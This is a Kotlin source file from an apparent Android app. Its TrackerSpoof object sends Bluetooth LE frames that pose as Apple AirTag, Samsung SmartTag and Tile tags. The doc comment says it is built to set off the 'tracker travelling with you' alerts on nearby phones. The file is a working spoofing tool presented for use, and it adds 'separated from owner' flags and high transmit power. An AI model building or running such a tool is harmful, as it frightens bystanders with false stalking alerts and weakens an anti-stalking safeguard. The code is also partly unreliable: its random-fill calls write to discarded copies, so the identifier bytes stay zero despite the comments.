package com.droid.whaly.active

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.os.ParcelUuid
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.security.SecureRandom
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Impersonates the three tracker ecosystems that raise "tracker travelling with you"
 * alerts: Apple Find My, Samsung SmartTag and Tile.
 *
 * The payloads are structurally what a real tag emits. The rotating identifier is random
 * rather than a derived P-224 point, which is enough for the detection heuristics that
 * drive the alerts; a Find My network relay would reject it.
 */
object TrackerSpoof {

    enum class Ecosystem(val label: String, val note: String) {
        AIRTAG("Apple AirTag", "Find My separated frame, 0x004C type 0x12"),
        SMARTTAG("Samsung SmartTag", "SmartThings service 0xFD5A"),
        TILE("Tile", "Tile service 0xFEED"),
        MIXED("All three", "cycles every ecosystem in turn"),
    }

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _frames = MutableStateFlow(0)
    val frames: StateFlow<Int> = _frames.asStateFlow()
    private val _status = MutableStateFlow("Idle")
    val status: StateFlow<String> = _status.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()

    private val active = AtomicBoolean(false)
    private val random = SecureRandom()

    private const val APPLE_COMPANY_ID = 0x004C
    private const val SAMSUNG_COMPANY_ID = 0x0075
    private val SMARTTAG_UUID: UUID = UUID.fromString("0000fd5a-0000-1000-8000-00805f9b34fb")
    private val TILE_UUID: UUID = UUID.fromString("0000feed-0000-1000-8000-00805f9b34fb")

    private const val ROTATE_MS = 900L

    fun stop() {
        active.set(false)
        _running.value = false
        _status.value = "Stopped"
    }

    @SuppressLint("MissingPermission")
    fun start(ecosystem: Ecosystem) {
        if (!active.compareAndSet(false, true)) return
        val adapter = try {
            BluetoothAdapter.getDefaultAdapter()
        } catch (_: SecurityException) {
            null
        }
        if (adapter == null || !adapter.isEnabled) {
            active.set(false)
            _status.value = "Bluetooth is off — enable it first"
            return
        }
        val advertiser: BluetoothLeAdvertiser = try {
            adapter.bluetoothLeAdvertiser
        } catch (_: SecurityException) {
            null
        } ?: run {
            active.set(false)
            _status.value = "This phone cannot advertise over BLE"
            return
        }

        _running.value = true
        _frames.value = 0
        _status.value = "Broadcasting ${ecosystem.label}"
        append("started ${ecosystem.label}")

        Thread({
            var index = 0
            while (active.get()) {
                val target = when (ecosystem) {
                    Ecosystem.MIXED -> Ecosystem.entries[index % 3]
                    else -> ecosystem
                }
                index++
                val data = buildFrame(target) ?: continue
                try {
                    advertiser.stopAdvertising(advertiserCallback)
                    advertiser.startAdvertising(
                        AdvertiseSettings.Builder()
                            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                            .setConnectable(false)
                            .setTimeout(0)
                            .build(),
                        data,
                        advertiserCallback,
                    )
                    _frames.value = _frames.value + 1
                    if (index % 8 == 0) {
                        _status.value = "${target.label} · ${_frames.value} frames"
                    }
                } catch (error: Exception) {
                    append("advertise failed: ${error.message}")
                    active.set(false)
                    _running.value = false
                    _status.value = "Advertising rejected"
                    return@Thread
                }
                try {
                    Thread.sleep(ROTATE_MS)
                } catch (_: InterruptedException) {
                    break
                }
            }
            runCatching { advertiser.stopAdvertising(advertiserCallback) }
        }, "whaly-tracker-spoof").start()
    }

    private val advertiserCallback = object : android.bluetooth.le.AdvertiseCallback() {
        override fun onStartFailure(errorCode: Int) {
            append("advertise callback failure $errorCode")
            _status.value = "Advertising failed ($errorCode)"
            active.set(false)
            _running.value = false
        }
    }

    private fun buildFrame(ecosystem: Ecosystem): AdvertiseData? = try {
        when (ecosystem) {
            Ecosystem.AIRTAG -> {
                // 0x12 = separated from owner, 0x19 = payload length, then status/battery
                // and a 22-byte rotating identifier.
                val payload = ByteArray(25)
                payload[0] = 0x12
                payload[1] = 0x19
                payload[2] = (0x20 or random.nextInt(0x20)).toByte()   // status: owned, battery in
                payload[3] = (0x40 or random.nextInt(0x40)).toByte()   // battery
                random.nextBytes(payload.copyOfRange(4, 25))
                AdvertiseData.Builder()
                    .addManufacturerData(APPLE_COMPANY_ID, payload)
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .build()
            }
            Ecosystem.SMARTTAG -> {
                val payload = ByteArray(17)
                random.nextBytes(payload)
                AdvertiseData.Builder()
                    .addServiceUuid(ParcelUuid(SMARTTAG_UUID))
                    .addManufacturerData(SAMSUNG_COMPANY_ID, payload)
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .build()
            }
            Ecosystem.TILE -> {
                val payload = ByteArray(18)
                payload[0] = 0x02
                random.nextBytes(payload.copyOfRange(1, 18))
                AdvertiseData.Builder()
                    .addServiceUuid(ParcelUuid(TILE_UUID))
                    .addServiceData(ParcelUuid(TILE_UUID), payload)
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .build()
            }
            Ecosystem.MIXED -> null
        }
    } catch (error: Exception) {
        append("frame build failed: ${error.message}")
        null
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(120)
    }
}
